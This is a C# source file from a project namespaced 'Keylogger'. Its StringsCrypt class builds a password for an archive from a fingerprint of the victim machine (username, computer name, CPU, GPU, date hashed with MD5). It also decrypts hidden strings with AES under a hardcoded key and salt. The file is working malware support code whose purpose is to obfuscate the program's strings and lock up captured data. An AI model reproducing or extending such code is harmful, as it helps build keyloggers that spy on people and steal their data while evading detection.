using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace Keylogger
{
    class StringsCrypt
    {

        public static string ArchivePassword = GenerateRandomData();

        public static string GenerateRandomData(string sd = "0")
        {
            var number = sd;
            if (sd == "0")
            {
                var d = DateTime.Parse(SystemInfo.Datenow);
                number = ((DateTimeOffset)d).Ticks.ToString();
            }

            var data =
                $"{number}-{SystemInfo.Username}-{SystemInfo.Compname}-{SystemInfo.Culture}-{SystemInfo.GetCpuName()}-{SystemInfo.GetGpuName()}";
            using (var hash = MD5.Create())
            {
                return string.Join
                (
                    "",
                    from ba in hash.ComputeHash
                    (
                        Encoding.UTF8.GetBytes(data)
                    )
                    select ba.ToString("x2")
                );
            }
        }
        public static string Decrypt(byte[] bytesToBeDecrypted)
        {
            byte[] CryptKey = Encoding.Default.GetBytes(";&KF!M!h8^iT:<)a?~mXeN*~o?gN[v@rQ=B");
            byte[] SaltByte = Encoding.Default.GetBytes("f3o3K-11=G-N7VJtozOWRr=(tNZBfK+bS7Fy");
            byte[] decryptedBytes;
            using (var ms = new MemoryStream())
            {
                using (var aes = new RijndaelManaged())
                {
                    aes.KeySize = 256;
                    aes.BlockSize = 128;
                    var key = new Rfc2898DeriveBytes(CryptKey, SaltByte, 1000);
                    aes.Key = key.GetBytes(aes.KeySize / 8);
                    aes.IV = key.GetBytes(aes.BlockSize / 8);
                    aes.Mode = CipherMode.CBC;
                    using (var cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        cs.Close();
                    }

                    decryptedBytes = ms.ToArray();
                }
            }

            return Encoding.UTF8.GetString(decryptedBytes);
        }
    }
}
